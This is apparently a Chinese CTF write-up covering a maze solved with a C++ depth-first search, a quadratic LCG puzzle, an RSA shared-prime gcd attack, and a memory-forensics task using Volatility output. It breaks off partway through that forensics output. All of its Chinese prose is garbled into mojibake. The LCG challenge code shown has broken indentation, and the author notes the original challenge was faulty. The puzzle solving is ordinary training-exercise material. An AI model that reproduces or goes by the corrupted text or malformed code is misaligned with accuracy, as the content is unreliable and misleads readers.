01010101010101010111011111010111110101111101011101011101010111110111111111110111011111010111111101110
01010001010100010100010100010101000100000000010101010001000000000101000000000000010101000100000000010
01011101010101110101110111010101111111111111010101011111111111110101010101011101010101110111111111010
01010101010000010101010000010100010101000101010000010100010100000000010101000101000001010101010100010
01010101010111110101011111010111010101110101011111010111010111111101010101110111111101010101010101010
01010101000001010101010100010101010001000000010100010100010101010001010101000100000001010001000001000
01010101011111010101010111010101011101111111010111010101010101011111111111111111111101011101010101010
01000001000101010000010100010001010000000000010000000001000100000001010101010000010000010000010101010
01110101011101011111010111010101011111110101011111111111110101011101010101011111011111011101111111110
01000100000100010000010100000100010101000101000000010101000001010000010100010100010000010001000101010
01011111111101111111010111111111010101111111111111010101111101111111010111010111010111011111110101010
00010000000100010100000000000000000001000100000001000000010001000101010101010100000100000101000000000
01110111111111010111111111111111111101110111111101111111011111110101010101010111111111110101110111110
01010000000100000101010001010101010001000100010000010100000101000000000000000101000101000101000100000
01011101111111110101011101010101010111110111011111010111110101110101010111010101110101011101111111110
01010000000100000000010000010100010101000101010100000101000101000101010100010001010000010101010101010
01010101111111110111111111010111010101110101010111110101110101111111111111111101011111010101010101010
00000100000101000001010101010101000001000001000100000101000001010101010000000000000000010001000000010
01111111111101110111010101010101111101111101110111110101111101010101011111111111011111011101111111010
00010001010101000101000000010000010001010000010101000001010101010100010000010000010000010001010001000
01010111010101110101111111011111010111011111010101110111010101010101111111011111111111011101011101110
01000001000001000101010000010100000101010100000101000001010100000000010100000101000000010001010000010
01111111110111110101011111010111110101010111110101111101010111110111110111110101111111011101011111010
01000101000001000000010000000100000000000000000101000000010100000000010101000001010000000000000100000
01011101011111110111111111110101010111111111010101111111010111110111110101111101011111110111110101010
01000100010101010101010000010001010100010100010001010100000100000100010001000000000000000100000001010
01011111010101010101011111011111111111010111111101010111010111010101111101111111110111110111110101110
01000100000001000101000000010001010000000101000000000100010000010000010000000000000100000100000101000
01011101010111110101111111011101011111010101111111110111111111111101111111111111011111111111010111110
01000001010001000001000100010000010100010001000001010101010101010000010101010100010000000000010100000
01011111111111111101110101111111010111010101111101010101010101011111010101010111111111011111111111110
01000001010101010101000000010100000100010100000000000000000000010101000000000001010000010001000101000
01010111010101010101111101110111011111111111111101010101010111010101111111111101011111011101110101110
00010001000100010101010001010101000101010100000001010101010100000000000101010100010100010001000001010
01111111011111010101011101010101011101010111111111011101011111110111110101010111010111111101110111010
00000001000101000100000001000001010101000101010000010001010000000100000001010100010101010000000000010
01111111110101011111011101111101010101011101011111111101111101011111011101010111010101011111011101010
00000001000101000100010001010000000101010101010100010001000001010000010000000100010101010000000101000
01110111110101011111111101010111011101010101010111010111111111111111010101110111010101011101010111110
00010001000000000101010000000100000101010100000100000100010101010000010101000100000000010001010100000
01111111111111011101011111010111011101010101111111111111010101011101111111110111010101011111110111110
00000101010101000101010000010100000100000100010100010100000001000001000101000000010101000100000100000
01111101010101110101011111010101110101111111010111010111111101111111110101111101110111110101010111110
00000100000001010001010000010101000000010101000100010100010001000101000000010000010100000001010100010
01111111110111011101011111111111111111010101011111010111011101110101010101011101010111010101111111010
01010101000001000000010001010101000100010101010101000000000000000000010101000001010100010101000000000
01010101111101111101111101010101110111010101010101111101011111111111010101010101011111111111110101110
01000001000001000001010000010001000000000001010101010001010001010000010101010101010000000100000101000
01011111111101111101011111011101111101111101010101011111111101011111111111011111111111110111111111110
01000001010000000000010101010101000001000101000101010101000000000101010100010001010001000100010100000
01010111011111111111010101010101111111110101011101010101111111110101010111111101011101011111010111110
00010001010001010000000000000101010100000000000101000101010001000001010101010000010001000100000100000
01111111011101011111111111110101010111010111110101011101011101111101010101011111011101010101010111010
00010101010100010101010000010001000100010100000100000101010100000000000000010100000000010001010000010
01110101010111010101011111011101110111111111110101111101010111111111110111110101010101011111111111110
01010001000000000001010100000000000101010101010000010101000100000100000001010001010101000100010000010
01010111111111010101010111111111110101010101011101110101110111110111110111011111111111010111010111010
01010001000100010100000101010100000101000100010001010101000001010101000001010001010000010100000100000
01010111110101111111011101010111110101110111010111010101111101010101111101011101011111111111111111010
01000001000001000100000100000100000100000101010001000101010000000101000001010100000100010101010000010
01011111111111110111110111011111110111110101010111110101011111011101111101010111110111010101011111110
01010101010101000101000001010101000100000001010101010100010000000101000000000101010100010000010101010
01010101010101110101111101010101110111111101010101010101111111011101111101011101010111011111010101010
00000101010100000001010000000001000100000001010100000000010101000100000001000101000000000100000000000
01111101010111111101010101010111110111110101010111111101110101011111111111110101111111110111110101110
01010001000101000001000101010001000000000100000101010000010000000101000101000001010001000101000101000
01010111011101111101111111110111111101111111110101011101111111011101110101110111011101110101111111110
01000000000101000001010101000001010001000000010101010000010100000001000001000101010001000101010101000
01011111111101111101010101111101011101111111010101011101110101111111111101110101010101110101010101110
00010100010101000000010101010000000001000000000000010000010100000001000001010001000100000000010101010
01110101110101111101010101011111111111111111110101111111010111011111111101010111111111111101110101010
00010000000001000001000100010101000101000000000100010101000101000101010001010001010100000000010000000
01110111111111111111110101110101110101111111011111010101110101011101011101010111010111111111011111110
00000000000001000101010100010101010001000100000100000000000000000001000001010001000100010100010101010
01111111111111110101010111010101011101110111010111011101010101111111111101010111110111010111010101010
00010100000101010100000100010101010101000000010100010001010100010101010000010101000101010101000101010
01110101111101010101010101110101010101111111111111111111111111010101011111010101110101010101110101010
00010000010101000001010000010100010101010101010100010101010100000101010100000001010000010001010000010
01110111110101111111111111010111010101010101010111010101010111110101010111110111011111010111011111010
00010101010001000000010001010100000100000101000100000001010101010001010101000001010100010001010101010
01110101010111111111011101010111110111110101011111111101010101011101010101110111010111010111010101012
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>ç„¶åå†™ä¸ªæ·±åº¦ä¼˜å…ˆçš„è„šæœ¬å°±å¯ä»¥è§£å‡ºæ¥äº†ã€‚ã€‚</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;
#include&lt;cstdio&gt;
#include&lt;cstring&gt;
using namespace std;
int x1[]&#x3D;&#123;1,0,-1,0&#125;,
    y1[]&#x3D;&#123;0,1,0,-1&#125;;
char w[] &#x3D; &#123;&#39;s&#39;,&#39;d&#39;,&#39;w&#39;,&#39;a&#39;&#125;;
char f[103][103];
char leng[500];
int flag &#x3D; 0;
bool vis[103][103];
int n&#x3D;101;
void dfs(int x,int y,int len)
&#123;        vis[x][y] &#x3D; 1;
        if(flag &#x3D;&#x3D; 1)
        return;
        if(f[x][y] &#x3D;&#x3D; &#39;2&#39;)
        &#123;
                for(int j &#x3D; 0;j&lt;&#x3D;len;++j)
                cout&lt;&lt;leng[j];
                flag &#x3D; 1;
                cout&lt;&lt;endl;
                return; 
        &#125;

        for(int i &#x3D; 0;i&lt;4;++i)
        &#123;
                int nx &#x3D; x+x1[i];
                int ny &#x3D; y+y1[i];
                if(nx&lt;0||ny&lt;0||nx&gt;&#x3D;n||ny&gt;&#x3D;n||vis[nx][ny] &#x3D;&#x3D; 1)
                continue;
                if(f[nx][ny] &#x3D;&#x3D; &#39;0&#39;)
                continue;
                leng[len] &#x3D; w[i];
                dfs(nx,ny,len+1);
                vis[nx][ny] &#x3D; 0;
        &#125; 
&#125;

int main() 
&#123;
        
        for(int i &#x3D; 0;i&lt;n;++i)
         for(int j &#x3D; 0;j&lt;n;++j)
                 cin&gt;&gt;f[i][j];
        dfs(1,0,0); 

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>md5ä¹‹åå°±æ˜¯flag</p>
<h3 id="å¯†ç 1-LCG"><a class="header-anchor" href="#å¯†ç 1-LCG">Â¶</a>å¯†ç 1 LCG</h3>
<p>è¿™ä¸ªé¢˜çœ‹èµ°çœ¼ï¼Œä¹Ÿæ˜¯é¢˜ç›®æœ‰ç‚¹é—®é¢˜ã€‚</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        
        <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed 
        
        <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            
            lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>
            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>
            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>
            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
            
            <span class="token triple-quoted-string string">'''
            b = 3831416627
            n = 2273386207
            seed = 2403188683
            s1 = 260742417
            s2 = 447908860
            c1 = 17275
            c2 = 28951
            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>é€šè¿‡seedï¼Œs1,s2å…ˆç®—å‡ºlcgçš„aå’Œc<br>
è¿™é‡Œé€šè¿‡c1,c2çš„è®¡ç®—æ˜¯æœ‰äº›æ­§ä¹‰çš„ï¼Œæœ€åçš„æ­£è§£æ˜¯c1æ˜¯æ²¡æœ‰å³ç§»å¸¦å…¥c2çš„è¿ç®—çš„ï¼Œä¸ç„¶æŒ‰ç…§åŸæ¥ä»£ç æ˜¯æ±‚ä¸å‡ºflagçš„ï¼Œå½“ç„¶è¿™ä¹Ÿå¯¼è‡´äº†ä¸€æ³¢äººè§£ä¸å‡ºæ¥,è¿™é‡Œè¿˜éœ€è¦æ³¨æ„æœ€åçš„flagæ˜¯32ä½ï¼Œflagéœ€è¦åŠ ä¸ªn</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
b <span class="token operator">=</span> <span class="token number">3831416627</span>
n <span class="token operator">=</span> <span class="token number">2273386207</span>
seed <span class="token operator">=</span> <span class="token number">2403188683</span>
s1 <span class="token operator">=</span> <span class="token number">260742417</span>
s2 <span class="token operator">=</span> <span class="token number">447908860</span>
c1 <span class="token operator">=</span> <span class="token number">17275</span>
c2 <span class="token operator">=</span> <span class="token number">28951</span>
a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s2<span class="token operator">-</span>s1<span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token operator">*</span><span class="token punctuation">(</span>s1<span class="token operator">-</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>seed<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n

c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">*</span>s1<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> b<span class="token operator">*</span>s1 <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token operator">%</span>n
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    c11 <span class="token operator">=</span> <span class="token punctuation">(</span>c1<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> i
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">*</span>a<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">==</span> c2<span class="token punctuation">:</span>
        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">-</span>c<span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>æ­£ç¡®çš„é¢˜ç›®</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        
        <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed 
        
        <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            
            lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>
            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>
            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
            
            <span class="token triple-quoted-string string">'''
            b = 3831416627
            n = 2273386207
            seed = 2403188683
            s1 = 260742417
            s2 = 447908860
            c1 = 17275
            c2 = 28951
            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<h3 id="å¯†ç 2"><a class="header-anchor" href="#å¯†ç 2">Â¶</a>å¯†ç 2</h3>
<p>å¾ˆç®€å•çš„è´¨å› æ•°gcdæ±‚å› æ•°</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">import gmpy2
from Crypto.Util.number import *
n1&#x3D; 12671827609071157026977398418260127577729239910356059636353714138256023623770344437013038456629652805253619484243190436122472172086809006270535958920503788271745182898308583012315393657937467583278528574109842696210193482837553369816110424840884683667932711439417044144625891738594098963618068866281205254024287936360981926173192169919836661589685119695804443529730259703940744061684219737502099455504322939948562185702662485642366411258841082322583213825076942399375712892608077960687636100621655314604756871227708407963698548718981737143081639214928707030543449473132959887760171345393471397998907576088643495456531
e1&#x3D; 65537
c1&#x3D; 5268497051283009363591890965286255308367378505062739645805302950184343652292967525985407935922935972883557494557593439711003227737116083417992112594428400382187113609935251268634230537282408994938066541612999550555591607744019286392765549844400176442415480559773688439693874264657925123598756193286897112566420847480601040372338338442932524410598834393630019038536173336696498743879160879377504894526001205060753543289059104874467150194596404490638065573974570258671195173327475871936431769234701590572816592485898568463143587137721883610069616008902637316459660001435171054741347142470208082183171637233299493273737
n2&#x3D; 18090800828995898324812976370950614944724424095669490324214928162454640462382724191043785592350299626782376411935499259428970532102686361824967300649916495702138825182857737210486173137998811993244590794690070307872074705348982970060304389842338043432383690934814892283936018142382990267868341375956549210694354065317328612440672169232803362481090661368782599819926970968509827001203936933692777821117679448168400620234261164018167404541446201828349880887526076468982840569645753428057937172715073817332736878737709704495317549386111938639861221307607948775421897063976457107356574428602380790814162110473018856344871
e2&#x3D; 4097
c2&#x3D; 2326267610355516153575986453727161366266816656017644910981028690283132055217271939475840618294311986463011398892570340626131158223217558335139831985973737748812636360601010312490160903427322848411507157238373313053959092326875136396134997877757316339153327290508806645882428114647041522287934007579220769189583249469879165078254248922442084985860374461188259818592181294686890335242981199427715392978546977718475462727987012437677290341463732660152302257234030751774759466703002189003437204934438026047163828083902584763527752033035438078609950665211243112982373167722458975172667665849715372158378299319548194854914
n3&#x3D; 14016899139767071357961567514373780608355222973882916699129907806456201886114368147540489514960479836424236595826190295819765979835270500889626994048655508134450908075698567925938340322498944878806273261377551132596295484579752118097281084614987064680928168918147910522922020462762688924459558896249968804885885853885632349539590507675397376494346489972596290270168847103345561743327300964196811506510943971437325302822974593782292850499524055338033832053610217461760698628614971171144300450574522839157187874548994036357212297166759231255765155759405207408315314182166142015547345744054533749334516820850300569790673
e3&#x3D; 1048577
c3&#x3D; 1507157402302225700443994264641838312753363380677759942918832857396550216927941389943122383728949792984913155517202501504817319345830153748955731880333992875210194306712098593166605310784068299411946792264365247471197716329666415403718297430110977954951479772565341847358286252098930408452594561104228639615640815799731581302607522977457874347224189202268831547055389518214072278766864028489294466057175201908756749666131546163372443691718757198229262989973810951064160488114367967684657242385568733678188829354802025582496625272334309487028498614869964712744826603931510547381997149345221530469380732265014466170524
p &#x3D; gmpy2.gcd(n1,n2)
q1 &#x3D; n1&#x2F;&#x2F;p
d1 &#x3D; gmpy2.invert(e1,(q1-1)*(p-1))
print(long_to_bytes(pow(c1,d1,n1)))
q2 &#x3D; n2&#x2F;&#x2F;p
d2 &#x3D; gmpy2.invert(e2,(q2-1)*(p-1))
print(long_to_bytes(pow(c2,d2,n2)))
p &#x3D; gmpy2.gcd(n2,n3)
q1 &#x3D; n3&#x2F;&#x2F;p
d1 &#x3D; gmpy2.invert(e3,(q1-1)*(p-1))
print(long_to_bytes(pow(c3,d1,n3)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<h3 id="misc1-å–è¯"><a class="header-anchor" href="#misc1-å–è¯">Â¶</a>misc1 å–è¯</h3>
<p>è¿™ä¸ªmiscæˆ‘åšçš„æœ‰ç‚¹ç‹—è¡€å’Œè„‘æ´ã€‚<br>
é¦–å…ˆæ‹¿åˆ°ä¹‹åï¼Œå·¥å…·æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œå‘ç°æ˜¯notepadå’Œç”»å›¾è½¯ä»¶ï¼ˆè¿™é‡Œæˆ‘å°±å¿½ç•¥äº†è¿˜æœ‰ä¸€ä¸ªå†™çš„ç¨‹åºwordpadï¼‰</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d8fe2b750f393e8d1c442bc5fc7800d3517ffdd5.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<p>ç„¶åæŠŠnotepadä¸œè¥¿dumpå‡ºæ¥</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">Volatility Foundation Volatility Framework 2.6
Process: 236
Text:
?

Text:
d

Text:


Text:
?

Text:
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

Process: 372
Text:
?

Text:
d

Text:


Text:
?

Text:
f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()
new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)

letter &#x3D; &#39;&#39;
secret &#x3D; int(letter,16)
print(secret)
for i in f:
    n &#x3D; int(i) ^ secret
    new.write(int(n).to_bytes(1, &#39;big&#39;))

Process: 132
Text:
?

Text:
d

Text:


Text:
?

Text:
